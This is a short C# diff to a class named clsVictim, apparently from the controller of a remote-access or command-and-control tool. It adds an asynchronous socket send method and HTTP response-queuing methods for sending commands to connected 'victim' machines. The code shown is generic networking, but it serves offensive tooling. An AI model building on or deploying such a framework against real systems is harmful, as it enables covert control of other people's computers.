@@ -112,6 +112,31 @@ public class clsVictim
             }
         }
     }
+    public void Send(byte[] abBuffer)
+    {
+        if (abBuffer == null)
+            return;
+
+        try
+        {
+            socket.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
+            {
+                try
+                {
+                    socket.EndSend(ar);
+                }
+                catch (Exception ex)
+                {
+                    clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
+                }
+            }), abBuffer);
+        }
+        catch (Exception ex)
+        {
+            clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
+        }
+    }
+
     public void encSend(int Command, int Param, string data)
     {
         new Thread(() =>
@@ -173,6 +198,22 @@ public class clsVictim
 
             }
         }), abBuffer);
+    }
+
+    public void fnHttpSend(string szMsg) => fnHttpSend(2, 0, szMsg);
+    public void fnHttpSend(int nCmd, int nParam, string szMsg)
+    {
+        var listener = (clsHttpListener)m_listener;
+        var resp = new clsHttpListener.clsHttpResp(nCmd, nParam, szMsg);
+        
+        listener.fnEnqueue(resp);
+    }
+    public void fnHttpSend(int nCmd, int nParam, byte[] abMsg)
+    {
+        var listener = (clsHttpListener)m_listener;
+        var resp = new clsHttpListener.clsHttpResp(nCmd, nParam, abMsg);
+
+        listener.fnEnqueue(resp);
     }
 
     public void Reconnect()
